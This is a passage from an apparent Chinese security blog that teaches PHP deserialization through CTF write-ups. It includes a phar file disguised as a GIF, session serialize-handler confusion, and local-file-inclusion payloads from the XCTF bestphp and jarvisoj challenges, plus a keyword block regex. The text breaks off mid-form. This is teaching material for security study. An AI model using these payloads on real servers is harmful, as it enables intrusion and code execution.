<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 得到 flag 的匿名函数</span></span><br><span class="line">    $FLAG = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);                    </span><br><span class="line">    $SECRET  = `/read_secret`;</span><br><span class="line">	<span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);   </span><br><span class="line">    @mkdir($SANDBOX);</span><br><span class="line">    @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123;                </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET);</span><br><span class="line">        <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;                                          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span>                                </span><br><span class="line">                 <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line"><span class="comment">//该函数不可绕过</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $SECRET;</span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">        $data = unserialize($data);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);            </span><br><span class="line">        <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取这个沙盒中的头像</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123;                                                 </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">&quot;m&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">    upload(check_session());</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">    show(check_session());</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这道题很明确就是一个反序列化的题，我们的目的就是通过反序列化 Admin 这个类得到我们的 flag。但是如果我们想利用 unserailize() ，通过控制其参数去实现我们的反序列化，我们就必须绕过对 cookie 的检测，但是cookie 是通过 remote_addr 配合 sha1 进行 hmac 签名生成的，想绕过他那是不可能的。现在我们就要思考一下 是不是能用 Phar 这个在不使用 unserialize() 的方式完成序列化成功 get flag，然后我们就看到了这个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">    file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只要的精心构造一个包含 Admin 对象、包含 avatar.gif 文件，并且 stub 是 <code>GIF89a</code> 的 phar 文件然后上传上去，下一次请求通过 Phar:// 协议让 file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后会利用匿名函数生成函数名的特点，这里就不多叙述。</p>
<p>这道题我在BUU上面一直没有复现成功，卡在上传phar文件，一直回显<code>fuck off</code>，不知道为什么，有知道的师傅可以赐教一下。</p>
<h3 id="LCTF2018-T4lk-1sch34p-sh0w-m3-the-sh31l">[LCTF2018] T4lk 1sch34p,sh0w m3 the sh31l</h3>
<p>这道题没有复现环境，是K0rz3n师傅根据上面这道题魔改的。</p>
<p>出题人的思路：</p>
<blockquote>
<p><a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">https://www.k0rz3n.com/2018/11/19/LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化学习-session反序列化</title>
    <url>/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞学习——Session反序列化">PHP反序列化漏洞学习——Session反序列化</h1>
<h2 id="0x01-PHP的Session机制">0x01 PHP的Session机制</h2>
<p>在学习 <strong>session</strong> 反序列化之前，我们需要了解这几个参数的含义。</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>session.save_handler</td>
<td>session保存形式。默认为files</td>
</tr>
<tr>
<td>session.save_path</td>
<td>session保存路径。</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>session序列化存储所用处理器。默认为php</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody>
</table>
<p>在上述的配置中，<code>session.serialize_handler</code>是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody>
</table>
<p>那么具体而言，在默认配置情况下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start()</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSION文件的内容是：<code>name|s:5:&quot;ca01h&quot;</code>，name是键值，<code>s:5:&quot;ca01h&quot;;</code>是<code>serialize(&quot;ca01h&quot;)</code>的结果。</p>
<p>在php_serialize引擎下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;ca01h&quot;;&#125;</code>。<code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
<p>在php_binary引擎下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code>。由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。</p>
<h2 id="0x02-PHP-Session反序列化的漏洞原因">0x02 PHP Session反序列化的漏洞原因</h2>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>
如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;ca01h&#x27;</span>] = <span class="string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:5:&quot;</span>ca01h<span class="string">&quot;;s:20:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这是因为当使用php引擎的时候，php引擎会以<code>|</code>作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;</code>作为SESSION的key，将<code>O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到stdClass这个类。</p>
<p>实际利用的话一般分为两种：</p>
<ul>
<li>
<p>session.auto_start=On</p>
<p>当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了<code>session_start()</code>），因为该过程是发生在<strong>脚本代码执行前</strong>，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo1.php</span></span><br><span class="line"><span class="keyword">if</span>(ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) </span><br><span class="line">  session_destroy();</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;test&#x27;</span>]))</span><br><span class="line">  $_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>访问<code>http://127.0.0.1/test/serialize/foo1.php?test=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610114506.png" alt=""></p>
<p>如果在这个session设置成功后，有其他的页面使用这个session，由于处理器的不同，就会导致安全问题。然而PHP自动注册Session会话是在脚本执行前，所以通过该方式只能注入PHP的内置类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// foo2.php</span></span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610114631.png" alt=""></p>
<blockquote>
<p>php.ini配置中session_use_trans_sid = 1才能跨页面访问SESSION</p>
</blockquote>
</li>
<li>
<p>session.auto_start=Off</p>
<p>当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// foo1.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610121850.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611110445.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// foo2.php</span></span><br><span class="line">  session_start();</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $hi;</span><br><span class="line">  </span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610122050.png" alt=""></p>
</li>
</ul>
<h2 id="0x03-例题解析">0x03 例题解析</h2>
<h3 id="2018-XCTF-Final-bestphp">2018 XCTF Final bestphp</h3>
<p>题目环境：<a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp</a></p>
<p>直接给出了<code>index.php</code>的源码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610235644.png" alt=""></p>
<p><code>call_user_func()</code>函数中的两个参数都是可控的，那么就可以回调<code>extract()</code>函数用户变量覆盖，进而读取本地文件：</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200610235853742.png" alt="image-20200610235853742"></p>
<p><code>http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=function.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filters</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/eval|assert|exec|passthru|glob|system|popen/i&#x27;</span>,$value))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Do not hack me!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=admin.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hello admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="comment">#echo &#x27;hello &#x27; + $_SESSION[&#x27;name&#x27;];</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you must login with admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来主要讨论session漏洞利用问题session+lfi，由于代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:/tmp&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>限制了我们无法直接去包含默认的路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_phpsessid</span><br></pre></td></tr></table></figure>
<blockquote>
<p>常见的Session存储位置：</p>
<p>/var/lib/php/sess_PHPSESSID</p>
<p>/var/lib/php/sessions/sess_PHPSESSID</p>
<p>/var/lib/php5/sess_PHPSESSID</p>
<p>/var/lib/php5/sessions/sess_PHPSESSID</p>
<p>/tmp/sess_PHPSESSID</p>
<p>/tmp/sessions/sess_PHPSESSID</p>
</blockquote>
<p>但是因为有变量覆盖因此可以通过<code>session_start()</code>，改变save_path的方式让session存储路径在open_basedir允许的目录下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p>然后去包含：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/t01e0532ccb6b2faf63.png" alt=""></p>
<p>这里有一个<code>$_SESSION['name']</code>，并且其可以被我们post的name复制，那这就可以达到控制session内容的目的。</p>
<p>使用Hackbar直接POST数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>再去包含对应的session：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611094600.png" alt=""></p>
<p>后面找到flag直接cat即可。</p>
<blockquote>
<p>介绍另外一种思路：PHP7.0本地文件包含漏洞 包含自身从而导致死循环：<a href="https://xz.aliyun.com/t/3174#toc-4">https://xz.aliyun.com/t/3174#toc-4</a></p>
</blockquote>
<h3 id="jarvisoj-PHPINFO">jarvisoj PHPINFO</h3>
<p>题目地址：<a href="http://web.jarvisoj.com:32784">http://web.jarvisoj.com:32784</a></p>
<p>在讲这道题之前，我们先来介绍一下<strong>session.upload_progress.enabled</strong></p>
<blockquote>
<p>当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611101827.png" alt=""></p>
<p>这道题涉及到两个知识点，第一个知识点就是<strong>PHP Session 序列化及反序列化处理器设置使用不当</strong>。我们可以看到，INI中默认的处理器是php_serialize，而程序使用的却是php处理器。</p>
<p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
<p>第二个知识点就是<strong>Upload progress in sessions</strong>，当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 session。</p>
<p>首先构造一个上传表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>       </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span 